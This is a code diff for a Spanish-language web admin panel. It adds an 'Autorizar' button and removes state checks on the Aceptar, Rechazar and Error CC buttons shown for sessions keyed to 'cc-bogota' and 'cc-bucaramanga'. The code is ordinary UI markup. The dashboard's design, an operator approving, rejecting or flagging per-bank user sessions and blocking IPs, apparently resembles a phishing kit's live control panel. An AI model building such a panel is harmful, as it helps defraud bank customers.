@@ -302,7 +302,7 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
             </div>
         </div>
 
-        <!-- 🔥 PESTAÑA HISTORIAL -->
+        <!-- PESTAÑA HISTORIAL -->
         <div class="tab-content" id="tab-historial">
             <div class="section">
                 <div class="section-header">
@@ -661,6 +661,10 @@ function renderActivos() {
     `).join('');
 }
 
+/* ============================================================
+   🔥 BOTONES DE SESIÓN
+   Para cc-bogota / cc-bucaramanga: Aceptar, Rechazar, Error CC, Autorizar, IP
+   ============================================================ */
 function botonesSesion(s) {
     const bancoKey = s.datos.bancoKey || '';
     const estado = s.estado;
@@ -669,15 +673,15 @@ function botonesSesion(s) {
     const btns = [];
 
     if (bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga') {
-        if (estado !== 'rechazado' && estado !== 'finalizado' && estado !== 'cc_error') {
-            btns.push(`<button class="btn btn-accept" title="Aceptar" onclick="accion('${sid}','ACEPTAR')">✅</button>`);
-        }
-        if (estado !== 'rechazado' && estado !== 'finalizado' && estado !== 'cc_error') {
-            btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
-        }
-        if (estado !== 'rechazado' && estado !== 'finalizado' && estado !== 'cc_error') {
-            btns.push(`<button class="btn" style="background:#f59e0b; color:white;" title="CC Error" onclick="accion('${sid}','CC_ERROR')">⚠️</button>`);
-        }
+        // 1. Aceptar
+        btns.push(`<button class="btn btn-accept" title="Aceptar" onclick="accion('${sid}','ACEPTAR')">✅</button>`);
+        // 2. Rechazar
+        btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
+        // 3. Error CC
+        btns.push(`<button class="btn" style="background:#f59e0b; color:white;" title="Error CC" onclick="accion('${sid}','CC_ERROR')">⚠️</button>`);
+        // 4. Autorizar
+        btns.push(`<button class="btn" style="background:#3b82f6; color:white;" title="Autorizar" onclick="accion('${sid}','AUTORIZAR')">🔐</button>`);
+        // 5. IP
         btns.push(`<button class="btn btn-block" title="Bloquear IP" onclick="bloquearIp('${ip}')">🚫</button>`);
         return btns.join('');
     }
